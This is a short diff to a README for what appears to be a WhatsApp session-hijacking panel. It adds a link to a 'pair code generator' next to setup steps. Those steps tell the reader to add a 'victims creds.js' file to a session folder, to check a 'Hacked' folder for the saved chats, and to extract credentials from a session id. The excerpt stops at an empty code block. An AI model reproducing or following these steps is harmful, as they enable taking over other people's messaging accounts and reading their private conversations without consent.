@@ -23,6 +23,8 @@
 <p align="left">° Upload zip and unzip And change startup command to bash and start pannel and run npm install and change startup cmd to 'npm start' </p>
 <p align="left">° Add victims creds.js file to session folder</a>
 <p align="left">° Start the pannel and see the Hacked folder for saved chats</a>
+<p align="left">° Pair code genarator 
+<a href="https://supun-md-session.vercel.app/"> me</a>
 <p align="left">° Use following to extract creds.js from session id</a>
 
 ```
